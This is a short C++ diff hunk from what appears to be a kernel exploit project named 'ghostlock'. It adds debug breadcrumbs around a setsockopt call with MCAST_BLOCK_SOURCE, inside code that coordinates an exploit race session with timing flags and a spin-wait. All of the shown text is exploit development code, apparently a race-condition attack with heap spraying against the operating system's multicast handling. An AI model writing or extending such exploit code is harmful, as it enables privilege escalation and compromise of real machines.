@@ -69,11 +69,14 @@ namespace ghostlock::route {
         session::g_exploit_session.race.consumer_stop.store(0);
         session::g_exploit_session.race.route_delay_usec.store(0);
         errno = 0;
+        support::spray_breadcrumb("mcast pre-copy");
         int32_t stamp_result =
                 setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
+        support::spray_breadcrumb("mcast post-copy");
         status.step = 61;
         status.error_number = errno;
         session::g_exploit_session.race.consumer_go.store(1);
+        support::spray_breadcrumb("mcast fire");
         for (int32_t spin = 0; spin < 100000000 &&
                            session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
             __asm__ volatile (
